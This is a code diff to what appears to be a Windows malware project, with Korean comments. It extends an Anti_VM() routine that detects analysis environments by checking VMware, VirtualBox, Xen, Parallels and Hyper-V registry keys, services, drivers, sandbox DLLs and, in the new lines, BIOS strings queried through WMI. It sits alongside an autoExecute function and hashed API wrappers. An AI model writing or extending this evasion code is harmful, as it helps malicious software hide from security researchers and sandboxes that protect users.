@@ -5,6 +5,7 @@
 #include <list>
 #include "HashModule.h"
 #include "HashFunction.h"
+#include "wmic.h"
 
 void autoExecute() {
     CHAR szDir[260];
@@ -31,11 +32,15 @@ void autoExecute() {
 
 /* VM이 아닐경우 TRUE 반환 */
 bool Anti_VM() {
+    WMIC wc;
+    std::string bios_info = wc.getBIOSInfo();
 
     HKEY hKey;
     std::list<std::string> services = {"vpcbus",  "vpc-s3",  "vpcuhub",  "msvmmouf",  "VBoxMouse",  "VBoxGuest",  "VBoxGuest",  "VBoxSF",  "xenevtchn", "xennet",  "xennet6",  "xensvc",  "xenvdb"};
     std::list<std::string> modules = { "dbghelp",  "SbieDll",  "api_log", "dir_watch",  "pstorec" };
     std::list<std::string> drivers = { "hsfs.sys", "vmhgfs.sys", "prleth.sys", "prlfs.sys", "prlmouse.sys", "prlvideo.sys", "prl_pv32.sys", "vpc-s3.sys", "vmsrvc.sys",  "vmx86.sys", "vmnet.sys" };
+    std::list<std::string> bioses = { "VMware", "VBOX", "VMW", "Hyper-V", "hyper-v"};
+
 
     /* 레지스트리 비교 */
     if (RegOpenKeyExA_c(HKEY_LOCAL_MACHINE, "SOFTWARE\\Vmware, Inc.\\VMware Tools", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
@@ -43,6 +48,15 @@ bool Anti_VM() {
     }
     else if (RegOpenKeyExA_c(HKEY_LOCAL_MACHINE, "SOFTWARE\\Vmware Inc\\VMware Tools", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
         return false;
+    }
+
+    /* bios 정보로 확인 */
+    for (std::string bios : bioses)
+    {
+        if (bios_info.find(bios) != std::string::npos)
+        {
+            return false;
+        }
     }
 
     std::string prefix = "SYSTEM\\ControlSet001\\Services\\";
